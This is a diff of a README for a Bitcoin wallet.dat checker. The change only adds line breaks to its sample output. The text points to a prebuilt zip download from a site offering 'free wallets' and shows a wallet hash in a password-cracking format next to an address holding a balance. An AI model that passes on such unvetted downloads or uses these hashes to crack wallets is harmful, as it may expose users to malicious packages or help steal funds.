@@ -30,10 +30,10 @@ To set up the environment and install the necessary dependencies, follow these s
 Download all package ready to run: https://privatekey2bitcoin.com/freewallets/datchecker.zip
 
 ## Example
-📂 Checking file: wallet0.92.dat
-✅ File is a valid Berkeley DB wallet.
-✅ File passed all checks.
-✅ Bitcoin Hash: $bitcoin$64$02fac009c7298c142c27aaf52a10b984bb578f124cb1ed0854fe460f16aa9cf4$16$1dabf1816b34e175$62719$2$00$2$00
-💰 Valid addresses with balance found:
-   Address: 19wCFh3wAqqWE9SNJu6QyBmCVX68zVGLH5 | Balance: 94953989
+📂 Checking file: wallet0.92.dat <br>
+✅ File is a valid Berkeley DB wallet.<br>
+✅ File passed all checks.<br>
+✅ Bitcoin Hash: $bitcoin$64$02fac009c7298c142c27aaf52a10b984bb578f124cb1ed0854fe460f16aa9cf4$16$1dabf1816b34e175$62719$2$00$2$00<br>
+💰 Valid addresses with balance found:<br>
+   Address: 19wCFh3wAqqWE9SNJu6QyBmCVX68zVGLH5 | Balance: 94953989<br>
 
